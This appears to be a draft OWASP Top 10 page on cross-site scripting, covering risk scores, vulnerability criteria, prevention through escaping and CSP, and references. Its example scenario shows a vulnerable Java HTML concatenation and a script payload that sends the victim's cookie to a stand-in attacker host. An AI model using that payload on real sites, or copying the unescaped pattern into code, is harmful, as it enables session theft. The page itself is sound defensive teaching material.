# A7 Cross Site Scripting

| Factor | Score | Description |
| -- | -- | -- |
| Threat agent | ? | The threat agent is app specific, and depends on access, motive, and goals against the data asset. |
| Exploitability | EASY (3) | Automated tools can exploit all three forms of XSS, and there are freely available exploitation frameworks. |
| Prevalence | WIDESPREAD (3) | XSS is the second most prevalent issue in the OWASP Top 10, and is found in around two thirds of all applications. |
| Detectability | EASY (3) | XSS can be discovered by SAST and DAST tools, as well as anyone with a browser. |
| Impact | MODERATE (2) | The impact of XSS is moderate for reflected and DOM XSS, and severe for stored XSS, with remote code execution on the victim's browser, such as stealing credentials, sessions, or delivering malware to the victim. |
| Business impacts | ? | The business impact is application specific, and depends on the classification and protection needs of your application and data. |
| Score | 6.0 | MEDIUM |

## Am I vulnerable to attack?

You are vulnerable to Server XSS if your server-side code uses user-supplied input as part of the HTML output, and you don't use context-sensitive escaping to ensure it cannot run. If a web page uses JavaScript to dynamically add attacker-controllable data to a page, you may have Client XSS. Ideally, you would avoid sending attacker-controllable data to unsafe JavaScript APIs, but escaping (and to a lesser extent) input validation can be used to make this safe.

Automated tools can find some XSS problems automatically. 
However, each application builds output pages differently and uses different browser side interpreters such as JavaScript, ActiveX, Flash, and Silverlight, usually using 3rd party libraries built on top of these technologies. 
This diveristy makes automated detection difficult, particularly when using modern single-page applications and powerful JavaScript frameworks and libraries. 
Therefore, complete coverage requires a combination of manual code review and penetration testing, in addition to automated approaches.

## How do I prevent

Preventing XSS requires separation of untrusted data from active browser content.

1. Escaping untrusted HTTP request data based on the context in the HTML output (body, attribute, JavaScript, CSS, or URL) will resolve [Server XSS](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting#Server_XSS) vulnerabilities. The [OWASP XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) has details on the required data escaping techniques.

2. Applying context sensitive encoding when modifying the browser document on the client side acts against [client XSS](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting#Client_XSS). When this cannot be avoided, similar context sensitive escaping techniques can be applied to browser APIs as described in the [OWASP DOM based XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet).

3. Enabling a [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)) (CSP) and moving inline javascript code to additional files will defend against XSS across the entire site, assuming no other vulnerabilities (such as upload path tampering or download path traversal) exist that would allow placing malicious code in the server files.

## Example Scenarios

The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:

`(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`

The attacker manipulates the ‘CC' parameter in his browser to:

`'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`

This attack causes the victim's session ID to be sent to the attacker's website, allowing the attacker to hijack the user's current session. 
Note that attackers can also use XSS to defeat any automated CSRF defense the application might employ. See 2017-A8 for information on CSRF.

## References

### OWASP
* [OWASP Proactive Controls - TBA]()
* [OWASP Application Security Verification Standard - TBA]()
* [OWASP Testing Guide: 1st 3 Chapters on Data Validation Testing]()
* OWASP Types of Cross-Site Scripting
* OWASP XSS Prevention Cheat Sheet
* OWASP DOM based XSS Prevention Cheat Sheet
* OWASP XSS Filter Evasion Cheat Sheet
### External
* CWE Entry 79 on Cross-Site Scripting
* Do we have a non-vendor reference for this? [PortSwigger: Client-side template injection](https://portswigger.net/knowledgebase/issues/details/00200308_clientsidetemplateinjection)
